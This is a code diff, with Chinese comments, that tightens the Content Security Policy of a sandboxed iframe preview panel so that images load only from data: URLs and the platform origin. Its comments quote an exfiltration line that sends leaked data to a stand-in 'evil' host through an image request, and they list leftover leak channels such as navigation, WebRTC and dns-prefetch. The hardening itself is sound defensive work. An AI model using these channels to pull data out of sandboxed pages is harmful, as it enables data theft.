@@ -16,13 +16,21 @@
  *   占——bundle 是攻击者控制的文本），在解析器语义下插入 CSP meta 后重新
  *   序列化。策略：default-src 'none' + script/style 'unsafe-inline'（单文件
  *   bundle 的本体就是 inline 脚本/样式）+ 平台 origin（katex 等构建资产，
- *   font-src 同理）+ img-src data:/https:（内置消毒器白名单保留远程题干
- *   图并强制 no-referrer，data: 支持图表）+ connect-src 限平台 origin。
+ *   font-src 同理）+ img-src data:/平台 origin（#500 P1-4：曾放行任意
+ *   `https:` 图源——`new Image().src='https://evil/?d='+leak` 是零门槛 GET
+ *   外带通道，与 fetch/sendBeacon 同罪；收紧后图源只剩 data: 内联与平台
+ *   origin，两处都是实际引用面：预览 bundle 无外链图（内置面板的消毒器
+ *   只产出 https 远程图——收紧后这类图随 CSP 一起失效降级为空，属安全
+ *   收敛的预期取舍））+ connect-src 限平台 origin。
  *   所有 origin 都写注入时的绝对值：opaque origin 下 'self' 不匹配任何
  *   URL（CSP3），写了等于没写。
  * - **已知残留**（meta-CSP 框架内无标准修法）：CSP 不治理 iframe 自导航，
- *   `location.href`/`<meta refresh>` 仍可携带 query 外传。fetch/sendBeacon/
- *   子资源/表单通道已闭合；导航通道作为接受的残留记录于此。
+ *   `location.href`/`<meta refresh>` 仍可携带 query 外传；同样不治理
+ *   WebRTC（`new RTCPeerConnection` 的 ICE 协商可向任意 STUN 服务器外发
+ *   数据）与 `<link rel="dns-prefetch">`/`rel="preconnect"` 的域名探测。
+ *   fetch/sendBeacon/img/子资源/表单通道已闭合；导航/WebRTC/dns-prefetch
+ *   通道作为接受的残留记录于此（均携带量有限——只能带出脚本已知的数据，
+ *   不能读取响应）。
  * - 桥只暴露只读方法（listArtifacts/readArtifact/getJobDetail），返回的都是
  *   当前页面用户本来就有权看到的数据；写操作（发布/归档/改配置）不走桥。
  * - 消息鉴别：opaque origin 的 event.origin 恒为 "null"，不能用来鉴权——
@@ -51,8 +59,10 @@ const DEFAULT_HEIGHT = 320
 /**
  * 出站网络红线（见文件头）。origin 用注入时的绝对值：opaque origin 下
  * 'self' 不匹配任何 URL（CSP3），写了等于没写——connect/script/style/font
- * 统一拼平台 origin。img-src 放行 https: 是内置消毒器的产品契约（题干
- * 远程图白名单保留 + 强制 no-referrer），data: 支持图表常见模式。
+ * 统一拼平台 origin。img-src 同样收敛到 `data:` + 平台 origin（#500
+ * P1-4）：预览 bundle 的实际图源只有 data: 内联（单文件 bundle 契约），
+ * 放行任意 `https:` 会给 `new Image().src='https://evil/?d='+leak` 留
+ * 零门槛 GET 外带通道——与 fetch/sendBeacon 同罪，一并闭合。
  */
 function buildPanelCsp(): string {
   // 测试（node 环境）与浏览器都取当前 origin；取不到时退化为不含 origin
@@ -67,7 +77,9 @@ function buildPanelCsp(): string {
     `script-src 'unsafe-inline'${withOrigin}`,
     `style-src 'unsafe-inline'${withOrigin}`,
     `font-src${withOrigin}`,
-    'img-src data: https:',
+    // data: 内联图（单文件 bundle 的常见模式）；远程图不再放行——远程
+    // 图源是任意外带 URL 的载体，产品取舍见函数头注释。
+    `img-src data:${withOrigin}`,
     // 面板经桥取数，不需要任何 XHR/fetch；connect-src 收紧到平台 origin，
     // 堵死 fetch/sendBeacon 外传通道。
     `connect-src${withOrigin}`,
